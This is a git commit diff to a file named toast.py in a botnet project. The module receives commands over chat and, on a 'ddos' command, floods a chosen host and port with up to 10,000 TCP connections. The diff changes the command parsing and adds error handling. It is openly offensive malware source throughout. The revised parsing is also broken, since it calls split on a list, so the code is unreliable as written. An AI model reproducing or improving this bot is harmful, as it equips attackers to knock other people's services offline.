d8db1efd3d774b1c82782310ec93451abb9e46ce
ded <stepanov.eltech@gmail.com>
2017-02-28 04:18:23 +0300

    some improvements

--- botnet/modules/builtin/toast.py
+++ botnet/modules/builtin/toast.py
@@ -23,22 +23,28 @@ class Toast(BaseResponder):
 		if self.is_command(msg):
 			command = (str(msg).split('!')[-1])
 			print('>>> COMMAND RECEIVED: %s' % command)
-			self.respond(msg, command + ' OK!')
-			cmd = command.split()
-			if cmd[0] == 'ddos' and cmd[1]:
-				# threading.Thread(target=self.dudos, kwargs={'host':cmd[1]}).start()
-				self.dudos(sock=msg, host=cmd[1])
-			elif cmd[0] == 'quit':
+			self.respond(msg, command + ' ok')
+			cmd, *params = command.split()
+
+			if cmd == 'ddos' and params:
+				host, port = params.split()
+				self.dudos(sock=msg, host=host, port=port)
+			elif cmd == 'quit':
 				self.respond(msg, 'Bye!')
 				exit()
 
 	def dudos(self, host='127.0.0.1', port=8080, times=10000, sock=None):
 		self.respond(sock, 'Dudos in progress...')
 		for _ in range(times):
-			print('.')
 			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			sock.connect((host, port))
-			sock.send(b'hello')
-			sock.close()
+			try:
+				sock.connect((host, port))
+				sock.send(b'hello')
+				sock.close()
+			except Exception as e:
+				print(e)
+				break
+
+
 
 mod = Toast
